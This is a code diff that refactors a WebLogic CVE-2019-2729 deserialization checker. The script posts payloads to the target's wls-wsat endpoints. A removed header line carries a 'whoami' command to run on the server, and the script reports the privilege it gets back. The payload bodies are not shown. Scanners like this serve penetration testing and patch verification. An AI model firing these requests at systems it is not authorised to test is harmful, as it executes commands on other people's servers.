@@ -8,18 +8,15 @@
 |_| \_\__,_|_.__/|_.__/|_|\__|_|  |_|\__,_|___/_|\_\
 
 '''
-import logging
+
 import sys
 import time
 
 import requests
 
-logging.basicConfig(filename='Weblogic.log',
-                    format='%(asctime)s %(message)s',
-                    filemode="w", level=logging.INFO)
+from config.config_requests import headers
 
 VUL=['CVE-2019-2729']
-headers = {'user-agent': 'ceshi/0.0.1', 'content-type': 'text/xml', 'cmd': 'whoami'}
 
 
 path1 = '/wls-wsat/CoordinatorPortType'
@@ -3547,22 +3544,18 @@ payload2 = '''
 '''
 
 
-def run(ip,port,index):
-    r1 = requests.post('http://' + str(ip) + ':' + str(port) + path1, headers=headers, data=payload1, timeout=3)
+def run(rip,rport):
+    r1 = requests.post('http://' + str(rip) + ':' + str(rport) + path1, headers=headers, data=payload1, timeout=3)
     time.sleep(1)
-    r2 = requests.post('http://' + str(ip) + ':' + str(port) + path2, headers=headers, data=payload2, timeout=3)
+    r2 = requests.post('http://' + str(rip) + ':' + str(rport) + path2, headers=headers, data=payload2, timeout=3)
     time.sleep(1)
-    r3 = requests.get('http://' + str(ip) + ':' + str(port) + '/_async/favicon.ico')
+    r3 = requests.get('http://' + str(rip) + ':' + str(rport) + '/_async/favicon.ico')
     if ((r1.status_code == 200) and 'uid' in r1.text) or ((r2.status_code == 202) and 'Vulnerable' in r3.text):
-        logging.info('[+]The target weblogic has a JAVA deserialization vulnerability:{}'.format(VUL[index]))
-        logging.info('[+]Your current permission is:  {}'.format(r1.text.replace('whoami : \r\n', '')))
-        print('[+]The target weblogic has a JAVA deserialization vulnerability:{}'.format(VUL[index]))
-        print('[+]Your current permission is:  {}'.format(r1.text.replace('whoami : \r\n', '')))
+        return (1, '[+] [{}] weblogic has a JAVA deserialization vulnerability:{}'.format(rip + ':' + str(rport), VUL[0]))
     else:
-        logging.info('[-]Target weblogic not detected {}'.format(VUL[index]))
-        print('[-]Target weblogic not detected {}'.format(VUL[index]))
+        return (0, '[-] [{}] weblogic not detected {}'.format(rip + ':' + str(rport), VUL[0]))
 
 if __name__ == '__main__':
     dip = sys.argv[1]
     dport = int(sys.argv[2])
-    run(dip,dport,0)
+    run(dip,dport)
